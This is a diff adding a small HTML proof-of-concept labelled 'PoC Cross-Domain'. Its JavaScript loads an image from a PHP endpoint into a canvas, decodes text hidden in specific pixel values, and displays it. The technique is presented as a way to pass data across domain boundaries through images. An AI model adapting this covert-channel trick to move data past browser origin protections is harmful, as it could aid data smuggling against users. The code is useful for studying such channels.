@@ -1,0 +1,47 @@
+<html>
+<head>
+<title>PoC Cross-Domain by Xianur0</title>
+<script language="javascript">
+function cargaContextoCanvas(idCanvas){
+ var elemento = document.getElementById(idCanvas);
+ if(elemento && elemento.getContext){
+    var contexto = elemento.getContext('2d');
+    if(contexto){
+       return contexto;
+    }
+ }
+ return FALSE;
+}
+window.onload = function(){
+ var ctx = cargaContextoCanvas('micanvas');
+ var cadena = "";
+ if(ctx){
+    var img = new Image();
+    img.src = 'estengrafia.php';
+    img.onload = function(){
+      ctx.drawImage(img, 0, 0);
+  var ele = document.getElementById('micanvas');
+  var canvasData = ctx.getImageData(0, 0, ele.width, ele.height);
+  for (var idx = 0; idx < (ele.width*ele.height)*4; idx+=4)  {
+      var r = canvasData.data[idx + 0];
+      var g = canvasData.data[idx + 1];
+      var b = canvasData.data[idx + 2];
+      var a = canvasData.data[idx + 3];
+      if(r == b && g == 0)
+        cadena += String.fromCharCode(b);
+  }
+  alert(cadena);
+    }
+ }
+}
+
+</script>
+</head>
+<body>
+<canvas id="micanvas" width="900" height="900">
+Tu navegador no soporta canvas.
+</canvas>
+<script>
+</script>
+</body>
+</html>
